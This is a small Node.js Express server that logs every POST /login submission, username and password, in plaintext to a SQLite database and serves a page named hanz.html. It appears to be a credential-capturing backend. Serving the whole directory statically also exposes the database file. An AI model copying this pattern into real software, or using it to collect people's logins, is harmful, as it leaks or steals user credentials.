const express = require('express');
const bodyParser = require('body-parser');
const sqlite3 = require('sqlite3').verbose();
const path = require('path');

const app = express();
const port = 3000;

// Middleware to parse JSON bodies
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files from the 'page' folder
app.use(express.static(path.join(__dirname)));

// Route to handle login attempts
app.post('/login', (req, res) => {
    const db = new sqlite3.Database(path.join(__dirname, 'login_attempts.db')); // Ensure this path is correct
    const username = req.body.username || '';
    const password = req.body.password || '';
    const attemptTime = new Date().toISOString();
    const successful = req.body.successful ? 1 : 0;

    // Insert login attempt into the database
    db.run('INSERT INTO login_attempts (username, password, attempt_time, timestamp, successful) VALUES (?, ?, ?, ?, ?)', 
    [username, password, attemptTime, attemptTime, successful], (err) => {
        if (err) {
            console.error('Error inserting login attempt:', err);
            res.status(500).send('Internal Server Error');
        } else {
            res.send('Login attempt recorded');
        }
    });

    db.close();
});

// Route to serve the HTML page
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'hanz.html'));
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
